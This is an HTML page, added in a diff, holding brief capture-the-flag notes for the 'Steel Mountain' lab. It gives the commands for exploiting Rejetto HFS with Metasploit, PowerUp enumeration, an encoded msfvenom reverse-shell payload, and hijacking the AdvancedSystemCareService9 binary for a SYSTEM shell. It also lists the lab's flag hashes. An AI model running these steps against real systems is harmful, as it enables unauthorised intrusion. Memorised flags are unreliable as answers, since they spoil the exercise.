@@ -1,0 +1,44 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Steel Mountain</title>
+</head><body><span style="font-size: 16pt">Employee Name</span><br/>
+<img height="227" src="image.png" width="500"/><br/>
+<span style="font-size: 16pt">--------------------------------------------------------------------------------------------------------------<br/>
+Gained Root shell with<br/>
+&gt; msfconsole<br/>
+&gt; search rejetto<br/>
+&gt; use 0<br/>
+</span><br/>
+<span style="font-size: 14pt">using port 8080 got rejetto http file server<br/>
+<a href="https://www.exploit-db.com/exploits/39161">https://www.exploit-db.com/exploits/39161</a><br/>
+<br/>
+=================================================<br/>
+UserFlag:<br/>
+b04763b6fcf51fcd7c13abc7db4fd365<br/>
+================================================<br/>
+<br/>
+upload powerup.ps1<br/>
+&gt; . .\PowerUp.ps1<br/>
+&gt; Invoke-AllChecks<br/>
+<br/>
+</span><span style="font-size: 18pt">The UserEsc strategy</span><ul><span style="font-size: 16pt"><li style="list-style-type: none">We are gonna replace a reverse shell inside the Service that can restart which happens to be AdvancedSystemCareService9</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">so we make a msf reverse shell</li>
+<li style="list-style-type: none">&gt; msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ur ip&gt; LPORT=5555 -e x86/shikata_ga_nai -f exe -o ASCService.exe</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">now upload it over meterpreter into the Programs Files (x86)/IObit</li>
+<li style="list-style-type: none">C:\&gt; sc stop AdvancedSystemCareService9</li>
+<li style="list-style-type: none">C:\&gt; COPY ASCService.exe &quot;Advanced SystemCare&quot;</li>
+</span><li style="list-style-type: none"><ul><span style="font-size: 14pt"><li style="list-style-type: none">*** this replaces the actual service</li>
+</span></ul>
+</li>
+<span style="font-size: 16pt"><li style="list-style-type: none">C:\&gt; sc start AdvancedSystemCareService9</li>
+<li style="list-style-type: none"/>
+<li style="list-style-type: none">boom catch the shell with another listener</li>
+</span></ul>
+<span style="font-size: 16pt">==================================================<br/>
+Root Flag:<ul><li style="list-style-type: none">9af5f314f57607c00fd09803a587db80</li>
+</ul>
+==================================================<br/>
+</span></body></html>
